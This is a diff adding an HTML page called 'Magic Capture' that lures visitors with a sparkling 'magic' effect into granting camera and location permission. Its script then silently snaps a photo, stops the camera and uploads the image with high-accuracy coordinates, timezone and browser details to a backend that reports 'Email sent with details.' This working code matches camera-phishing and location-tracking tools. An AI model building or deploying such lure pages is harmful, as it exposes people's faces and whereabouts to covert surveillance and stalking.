@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Magic Capture</title>
+  <style>
+    :root{--bg:#0f1724;--card:#0b1220;--accent:#7c3aed;color-scheme:dark}
+    html,body{height:100%;margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial;background:linear-gradient(180deg,#071123 0%,#0b1627 100%);color:#e6eef8;display:flex;align-items:center;justify-content:center}
+    .card{width:320px;max-width:92%;padding:20px;border-radius:12px;background:rgba(255,255,255,0.03);box-shadow:0 8px 30px rgba(2,6,23,0.6);text-align:center}
+    h1{margin:0 0 8px;font-size:18px}
+    p{margin:0 0 16px;font-size:13px;color:rgba(230,238,248,0.8)}
+    video{display:none;width:100%;border-radius:8px;margin-bottom:10px}
+    .magic {
+      width:72px;height:72px;margin:10px auto 12px;border-radius:50%;
+      background:linear-gradient(135deg,var(--accent),#06b6d4);
+      filter:drop-shadow(0 6px 20px rgba(124,58,237,0.22));
+      display:flex;align-items:center;justify-content:center;font-weight:700;color:white;font-size:22px;
+      transform:scale(0.95); animation:pop 900ms ease-in-out infinite;
+    }
+    @keyframes pop {0%{transform:scale(0.95)}50%{transform:scale(1.08)}100%{transform:scale(0.95)}}
+    .status{font-size:14px;margin-top:6px}
+    .small{font-size:12px;color:rgba(230,238,248,0.7)}
+    a { color: #7c3aed; text-decoration: none; }
+  </style>
+</head>
+<body>
+  <div class="card" role="main" aria-live="polite">
+    <h1>Magic Capture</h1>
+    <p>Camera और Location की permission दे तो तुरंत photo लिया जाएगा — सब background में हो जाएगा.</p>
+
+    <div class="magic" id="magic">✨</div>
+
+    <video id="video" autoplay playsinline muted></video>
+
+    <div class="status" id="status">Waiting for permissions…</div>
+    <div class="small" id="info"></div>
+  </div>
+
+<script>
+(async function(){
+  const statusEl = document.getElementById('status');
+  const infoEl = document.getElementById('info');
+  const video = document.getElementById('video');
+  const backendUrl = 'http://localhost:3000/upload'; // <-- change if deployed
+
+  function safeLog(...args){ console.log('[magic]',...args) }
+
+  // 1) Request camera and location permissions together (best-effort)
+  async function requestPermissions() {
+    statusEl.textContent = 'Requesting camera & location permission…';
+    try {
+      // Request camera
+      const streamPromise = navigator.mediaDevices.getUserMedia({ video: true });
+
+      // Request geolocation (non-blocking fallback)
+      const geoPromise = new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(pos),
+          err => resolve(null),
+          { enableHighAccuracy: true, timeout: 4000 }
+        );
+      });
+
+      // Wait for camera (will prompt)
+      const stream = await streamPromise; // user must Allow or block here
+      const geo = await geoPromise; // may resolve null
+
+      return { stream, geo };
+    } catch (err) {
+      safeLog('Permission denied or error', err);
+      return { stream: null, geo: null, error: err };
+    }
+  }
+
+  // 2) Fast capture -> stop -> background upload
+  async function captureAndUpload(stream, geo) {
+    try {
+      statusEl.textContent = 'Capturing photo…';
+      // show video briefly (keeps UX honest)
+      video.srcObject = stream;
+      video.style.display = 'block';
+
+      // Wait tiny time for camera auto-adjust (200-700ms depending)
+      await new Promise(r => setTimeout(r, 650));
+
+      // Capture frame
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Immediately stop camera
+      stream.getTracks().forEach(t => t.stop());
+      video.srcObject = null;
+      video.style.display = 'none';
+      safeLog('Camera stopped');
+
+      statusEl.textContent = 'Uploading in background…';
+
+      // Build form data
+      const blob = await new Promise(res => canvas.toBlob(res, 'image/png', 0.9));
+      const formData = new FormData();
+      formData.append('photo', blob, 'magic.png');
+
+      // add device/time/location fields
+      formData.append('deviceInfo', navigator.userAgent || 'Unknown');
+      formData.append('timezone', Intl.DateTimeFormat().resolvedOptions().timeZone || '');
+      if (geo && geo.coords) {
+        formData.append('lat', geo.coords.latitude);
+        formData.append('lon', geo.coords.longitude);
+        formData.append('locationAccuracy', geo.coords.accuracy || '');
+      }
+
+      // Send but don't block UI long — show progress text
+      fetch(backendUrl, { method: 'POST', body: formData })
+        .then(async (r) => {
+          try {
+            const data = await r.json();
+            if (r.ok) {
+              safeLog('Upload success', data);
+              statusEl.innerHTML = `Done — <a href="${data.filePath}" target="_blank">Open photo</a>`;
+              infoEl.textContent = 'Email sent with details.';
+            } else {
+              safeLog('Upload failed', data);
+              statusEl.textContent = 'Upload failed (server).';
+              infoEl.textContent = JSON.stringify(data).slice(0,200);
+            }
+          } catch(e){
+            safeLog('Upload response parse error', e);
+            statusEl.textContent = 'Upload finished (no response).';
+          }
+        })
+        .catch(err => {
+          safeLog('Upload network error', err);
+          statusEl.textContent = 'Upload failed (network).';
+        });
+    } catch (err) {
+      safeLog('capture/upload error', err);
+      statusEl.textContent = 'Capture/upload error';
+      // ensure camera stopped if error
+      try { if (stream) stream.getTracks().forEach(t=>t.stop()); } catch(e){}
+    }
+  }
+
+  // Main: ask permissions, then if allowed do the magic
+  const { stream, geo, error } = await requestPermissions();
+  if (!stream) {
+    statusEl.textContent = 'Permission denied or camera unavailable.';
+    infoEl.textContent = error ? String(error).slice(0,200) : '';
+    return;
+  }
+
+  // animate magic text then capture
+  statusEl.textContent = 'Permission granted — doing magic ✨';
+  // small UX pause so user sees "magic"
+  setTimeout(() => captureAndUpload(stream, geo), 400);
+})();
+</script>
+</body>
+</html>
